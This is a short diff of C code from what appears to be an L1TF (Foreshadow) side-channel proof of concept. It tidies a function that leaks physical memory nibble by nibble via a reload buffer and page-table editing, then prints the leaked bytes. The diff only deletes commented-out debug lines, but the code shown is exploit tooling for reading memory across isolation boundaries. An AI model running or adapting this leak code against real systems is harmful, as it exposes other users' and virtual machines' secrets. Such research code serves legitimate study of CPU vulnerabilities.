@@ -410,7 +410,6 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   assert(start + length < 0xfff);
 
   for (int iter = 1; iter <= 10000; ++iter) {
-    // while (true) {
     for (size_t i = 0, j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
       size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble);
@@ -419,12 +418,10 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
       results[i++] = result;
     }
 
-    //printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
     for (size_t i = 0; i < length; ++i) {
       printf("%02x ", results[i]);
     }
     printf("\n");
-    // }
   }
 
   free(results);
@@ -433,9 +430,6 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   l1tf_reload_buffer_free(reload_buffer);
 
   ptedit_cleanup();
-
-  //
-  // printf("hellO!");
 }
 
 void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]) {
